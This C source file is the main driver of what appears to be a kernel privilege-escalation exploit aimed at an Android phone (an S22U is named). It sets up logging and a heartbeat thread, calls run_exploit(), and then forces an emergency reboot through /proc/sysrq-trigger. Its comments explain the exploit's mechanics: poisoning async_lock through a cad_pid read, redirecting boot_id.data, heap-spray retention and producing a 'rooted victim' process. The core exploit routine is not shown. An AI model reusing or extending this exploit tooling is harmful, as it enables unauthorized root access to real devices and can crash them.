#include "common.h"
#include <linux/reboot.h>

/* §113.28c heartbeat.  It must live INSIDE this process: an external heartbeat
   (a busybox loop) forks a new process every couple of seconds, and the newest
   process becomes init_task.tasks.prev - i.e. the seq's B'' tail read would
   target busybox instead of us (QEMU run zl_ib_6 proved the verify round
   catches exactly that, and aborts).  A thread costs no new process. */
static void *hb_thread(void *a __attribute__((unused))) {
    for (;;) {
        if (write(1, "H", 1) != 1) {
            /* stdout gone; keep beating on stderr */
            write(2, "H", 1);
        }
        sleep(2);
    }
    return NULL;
}

int main(int argc, char **argv) {
    /* Device lesson (§108): on a kernel panic the page cache is never written
       back, so a redirected log file comes back as NUL bytes.  Unbuffered
       stdout means every line is write()n immediately - over an adb pipe the
       host keeps it even if the phone dies mid-run. */
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("QMAIN: start pid=%d\n", getpid());
    /* §124.16 boot marker: every run.log carries its own birth certificate, so a
       multi-boot account never has to be reconstructed after the fact (the
       userland read happens BEFORE any seq redirects boot_id.data). */
    {
        int bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
        if (bf >= 0) {
            char bb[64];
            ssize_t bn = read(bf, bb, sizeof(bb) - 1);
            close(bf);
            if (bn > 0) {
                bb[bn] = 0;
                for (ssize_t i = 0; i < bn; i++) {
                    if (bb[i] == '\n') {
                        bb[i] = 0;
                    }
                }
                /* 124.29: interpret the marker.  After a clean-abort fast
                   rerun, boot_id.data still points at a foreign task comm,
                   so this read prints a comm string rather than a UUID -
                   that IS the expected same-boot-rerun shape. */
                int looks_uuid = (strlen(bb) == 36);
                for (int i = 0; looks_uuid && i < 36; i++) {
                    char c = bb[i];
                    if (i == 8 || i == 13 || i == 18 || i == 23) {
                        if (c != '-') looks_uuid = 0;
                    } else if (!((c >= '0' && c <= '9') ||
                                 (c >= 'a' && c <= 'f') ||
                                 (c >= 'A' && c <= 'F'))) {
                        looks_uuid = 0;
                    }
                }
                printf("QMAIN: boot_id=%s [%s]\n", bb,
                       looks_uuid
                           ? "fresh boot UUID"
                           : "NON-UUID => same-boot rerun (boot_id.data still redirected)");
            }
        }
    }
    /* §124.26 ledger column: launch uptime is the operator-actionable proxy for
       "spray retention" (S22U's own advice: reboot, close background apps, keep
       the device unlocked and idle).  With a per-run uptime in the log, the
       ledger can correlate retention with how soon after boot we launched. */
    {
        FILE *uf = fopen("/proc/uptime", "re");
        if (uf) {
            double up = -1;
            if (fscanf(uf, "%lf", &up) == 1) {
                printf("QMAIN: launch uptime=%.1fs\n", up);
            }
            fclose(uf);
        }
    }
    fflush(stdout);
    pthread_t hb;
    if (pthread_create(&hb, NULL, hb_thread, NULL) == 0) {
        pthread_detach(hb);
    }
    int r = run_exploit(argc, argv);
    printf("QMAIN: run_exploit returned %d\n", r);
    /* §117: stdio FIRST.  sync() only flushes kernel dirty pages; the tail of
       our log is still in the userspace stdio buffer and would be lost if we
       die inside the reboot syscall (which is exactly what happened on the
       device in §116.4 - that, not a mid-seq panic, is why the tail was
       missing). */
    fflush(NULL);
    sync();
    /* §117: prefer the emergency path.  kernel_restart_prepare() and
       kernel_power_off() both call device_shutdown() -> wait_for_device_probe()
       -> async_synchronize_full(), which takes async_lock - the single word our
       cad_pid read poisons and we cannot restore (value=0 is not expressible
       with this primitive: the collateral would fault at *(0+8)).
       emergency_restart() skips device_shutdown entirely; its userspace entry
       is SysRq-b.  Falls back to the normal path if the write is refused. */
    {
      int fd = open("/proc/sysrq-trigger", O_WRONLY);
      if (fd >= 0) {
        ssize_t w = write(fd, "b", 1);
        printf("QMAIN: sysrq-trigger 'b' write=%zd errno=%d (emergency_restart)\n",
               w, errno);
        close(fd);
      } else {
        printf("QMAIN: /proc/sysrq-trigger open failed errno=%d\n", errno);
      }
    }
    fflush(NULL);
    sync();
#ifdef ZF9_DEVICE
    /* §117.b: on the device this process is only `shell`, so the sysrq write
       above fails with EACCES - and the normal reboot path would panic (it runs
       device_shutdown -> async_lock, the word the cad_pid read poisons).  Worse,
       doing it here preempts the ROOTED VICTIM's clean exit (it waits 30 s so the
       operator can collect evidence, then does sync + 'b' from init domain).
       So the device build never reboots: it prints and exits, leaving the
       victim/operator in charge. */
    printf("QMAIN: device build - reboot left to the rooted victim (sysrq) or the operator\n");
#else
    syscall(SYS_reboot, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
            LINUX_REBOOT_CMD_POWER_OFF, NULL);
#endif
    return r;
}
